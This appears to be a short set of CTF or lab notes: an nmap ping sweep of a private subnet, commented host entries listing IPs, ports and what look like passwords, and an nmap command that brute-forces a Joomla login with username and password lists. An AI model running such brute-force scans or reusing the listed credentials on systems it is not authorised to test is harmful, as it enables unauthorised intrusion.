nmap 192.168.1.1/24 -sn -oG ip.txt

# 172.16.9.41   ctf  sDm7vbxj  8888   6022   22  5022  
# 172.16.9.42         WpvsH8*X  8080 6023   22  5023
# 172.16.9.44         HTetx4Ds    80  6025  22 5025
# 45     cqg            AvMh*DTp   22 5021  80 6021

nmap -p80 --script http-joomla-brute --script-args userdb=user.txt,passdb=pass.txt 192.168.22.131
